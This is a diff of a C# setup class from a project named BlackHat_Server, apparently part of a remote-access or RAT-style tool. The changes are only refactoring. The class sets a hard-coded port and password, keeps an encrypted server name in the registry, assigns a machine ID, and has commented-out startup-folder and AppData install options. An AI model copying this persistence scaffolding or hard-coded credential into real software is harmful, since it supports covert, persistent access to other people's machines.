@@ -1,15 +1,10 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Text;
-using System.Windows.Forms;
-
-namespace BlackHat_Server
+﻿namespace BlackHat_Server
 {
-    class CreateStClient
+    internal class CreateStClient
     {
         public bool InitializeStClient()
         {
-            ResUtile ru = new ResUtile();
+            var ru = new ResUtile();
             //TEST
             ST_Client.Instance.Port = 2401;
             ST_Client.Instance.Password = "cammello";
@@ -51,7 +46,6 @@ namespace BlackHat_Server
             //ST_Client.Instance.bUseStartupFolder = usestart;
 
 
-
             //ST_Client.Instance.sAppDataInstall = apppath;
             //ST_Client.Instance.sStartupFileName = startupfilename;
 
@@ -71,15 +65,17 @@ namespace BlackHat_Server
 
 
             // GESTIONE SERVER NAME
-            RegistryManager rm = new RegistryManager();
-            Text_Des td = new Text_Des();
+            var rm = new RegistryManager();
+            var td = new Text_Des();
 
             string servName;
 
-            bool regExist = rm.ExistServerNameEntry();
+            var regExist = rm.ExistServerNameEntry();
 
             if (regExist)
+            {
                 servName = td.Decrypt(rm.GetNameFromRegistry(), true);
+            }
             else
             {
                 servName = ru.GetServerName(); // LO PRENDO DALLE RISORSE LA PRIMA VOLTA
@@ -87,19 +83,17 @@ namespace BlackHat_Server
                 if (servName == null)
                     servName = "NO NAME";
 
-                rm.SetNewNameInRegistry(td.Encrypt(servName, true)); // prima esecuzione setto il nome sul registro                
+                rm.SetNewNameInRegistry(td.Encrypt(servName,
+                    true)); // prima esecuzione setto il nome sul registro                
             }
 
             ST_Client.Instance.ServerName = servName;
             //-------------------------------------------------
 
-            UnivoqueID uid = new UnivoqueID();
+            var uid = new UnivoqueID();
             ST_Client.Instance.UnivoqueID = uid.GetUnivoqueID(); // ASSEGNO IL CODICE UNIVOCO    
 
             return true;
-
-
         }
-
     }
 }
